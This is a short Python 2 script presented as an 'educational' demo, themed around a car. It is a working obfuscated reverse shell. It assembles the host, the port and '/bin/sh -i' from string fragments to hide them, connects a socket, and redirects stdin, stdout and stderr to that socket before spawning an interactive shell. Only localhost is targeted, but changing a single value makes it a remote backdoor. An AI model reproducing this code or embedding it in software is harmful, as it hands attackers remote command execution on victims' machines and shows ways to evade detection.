#!/usr/bin/env python
"""
🚗 My Car (Reverse Shell Obfuscation Demo) 🏎️
This script demonstrates a simple obfuscated reverse shell using weird variable names.
EDUCATIONAL PURPOSE ONLY! 🎓
"""

import os
import subprocess
import socket

class HiddenShell:
    def __init__(self):
        # 🧩 Constructing IP "127.0.0.1"
        self.ip_part1 = "127"
        self.ip_part2 = ".0"
        self.ip_part3 = ".0.1"
        self.target_ip = self.ip_part1 + self.ip_part2 + self.ip_part3
        
        # 🔢 Port 8000
        self.target_port = 100 * 80 
        
        # 🐚 Shell Path "/bin/sh"
        self.shell_path = "/" + "b" + "i" + "n" + "/" + "s" + "h"
        
        # 🚗 Argument "-i"
        self.arg = "-" + "i"
        
        print "🏎️  Car Initialized."
        print "    Heading to: " + self.target_ip + ":" + str(self.target_port)

    def drive(self):
        try:
            # 🛣️ Create Socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.target_port))
            
            # 🌉 Bridge file descriptors (stdin, stdout, stderr) to socket
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # 🚀 Launch Shell
            print "    🚀 VROOM! Launching shell..."
            subprocess.call([self.shell_path, self.arg])
            
        except Exception as e:
            print "    💥 Crash: " + str(e)

if __name__ == "__main__":
    car = HiddenShell()
    car.drive()
